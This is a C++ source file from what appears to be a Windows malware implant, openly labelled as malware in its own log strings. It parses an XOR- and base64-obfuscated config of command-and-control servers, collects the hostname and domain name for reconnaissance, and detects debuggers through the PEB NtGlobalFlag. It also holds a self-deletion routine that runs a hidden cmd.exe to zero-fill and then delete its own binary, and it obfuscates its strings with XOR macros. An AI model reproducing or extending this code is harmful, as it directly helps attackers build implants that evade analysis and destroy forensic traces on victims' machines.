#include <winsock2.h>
#include <ws2tcpip.h>
#include "util.hpp"

namespace util {
    std::wstring string_to_wstring(const std::string& str) {
	    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	    return converter.from_bytes(str);
    }

    std::string XorStringData(std::string data) {
        std::string output = data;
        for (size_t i = 0; i < data.size(); ++i) {
            output[i] = data[i] ^ settings::configKey[i % settings::configKey.size()];
        }

        return output;
    }

    bool ReadParseConfig() {
        std::ifstream file(settings::config_path);

        if (!file.is_open()) {
	        XorLogger::LogError(XOR_LIT("Failed to open config file."));
	        return false;
        }
        std::string content((std::istreambuf_iterator<char>(file)),
            (std::istreambuf_iterator<char>()));
        XorLogger::LogDebug("Config file contents: " + content);
        file.close();

        std::string base64Decoded = Base64Decoder::base64_decode_string(content);
        std::string xorDecoded = util::XorStringData(base64Decoded);
        std::stringstream ss(xorDecoded);
        char delimiter = ';';
        std::vector<std::string> config;
        std::string temp;

        while (std::getline(ss, temp, delimiter)) {
	        config.push_back(temp);
        }
        if (config.size() <= 1) {
	        XorLogger::LogError(XOR_LIT("Malformed config."));
	        return false;
        }
        XorLogger::LogInfo(XOR_LIT("Adding Malware ID: ") + config.at(0));
        settings::malware_id = config.at(0);

        for (int i = 1; i < config.size(); i++) {
	        XorLogger::LogInfo(XOR_LIT("Adding C2 Server: ") + config.at(i));
	        settings::C2_SERVERS.push_back(config.at(i));
        }
        return true;
	}
}

namespace recon {
    std::string GetSystemComputerName() {
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = MAX_COMPUTERNAME_LENGTH + 1;

        if (!GetComputerName(computerName, &size)) {
            XorLogger::LogWarning(XOR_LIT("Unable to retrieve computer name"));
            return XOR_LIT("Unable to retrieve computer name");
        }

        XorLogger::LogDebug(XOR_LIT("Hostname: ") + std::string(computerName));
        return std::string(computerName);
    }

    std::string GetSystemDomainName() {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        char hostname[256];

        gethostname(hostname, sizeof(hostname));

        addrinfo hints = {};
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_CANONNAME;

        addrinfo* info;

        if (getaddrinfo(hostname, nullptr, &hints, &info) != 0) {
            WSACleanup();
            XorLogger::LogWarning(XOR_LIT("Unable to get domain name"));
            return XOR_LIT("Unable to get domain name");
        }

        std::string domainName = info->ai_canonname;
        freeaddrinfo(info);
        WSACleanup();

        XorLogger::LogDebug("Domain name: " + domainName);
        return domainName;

    }
}

namespace evasion {

    bool IsProcessBeingDebugged() {

        PPEB pPeb = (PPEB)(__readgsqword(0x60));
        DWORD dwNtGlobalFlag = *(PDWORD((PBYTE)pPeb + 0xBC));

        return dwNtGlobalFlag & (FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_VALIDATE_PARAMETERS);
    }

    void DeleteApplicationImageAfterExecution() {
        wchar_t path[MAX_PATH] = { 0 };
        std::wstring filePathW(path);
        if (!GetModuleFileNameW(NULL, path, MAX_PATH)) {
            XorLogger::LogError(XOR_LIT("Failed to get image path. Potentially not image backed. Error: ") + GetLastError());
            return;
        }
        
        std::ifstream file(std::wstring(path), std::ifstream::ate | std::ifstream::binary);
        if (!file) {
            XorLogger::LogError(XOR_LIT("Failed to find binary at current path. Already deleted, or not image backed?"));
            return;
        }

        std::uintmax_t fileSize = file.tellg();
        XorLogger::LogInfo(XOR_LIT("Image size is: ") + std::to_string(fileSize));
        std::wstring paramString = XOR_WIDE_LIT(L"/c ping 127.0.0.7 -n 7 > Nul & fsutil file setZeroData offset=0 length=") + std::to_wstring(fileSize) + L" " + std::wstring(path) + XOR_WIDE_LIT(L" &del / f / q ") + std::wstring(path);
        std::wstring paramWString(paramString.begin(), paramString.end());
        SHELLEXECUTEINFOW sei = { 0 };
        sei.cbSize = sizeof(SHELLEXECUTEINFOW);
        sei.fMask = SEE_MASK_DEFAULT;
        sei.hwnd = NULL;
        sei.lpVerb = XOR_WIDE_LIT(L"open");
        sei.lpFile = XOR_WIDE_LIT(L"cmd.exe");
        sei.lpParameters = paramWString.c_str();
        sei.lpDirectory = NULL;
        sei.nShow = SW_HIDE;


        if (!ShellExecuteExW(&sei)) {
            XorLogger::LogError(XOR_LIT("Failed to start Self-deletion process."));
        }
    }
}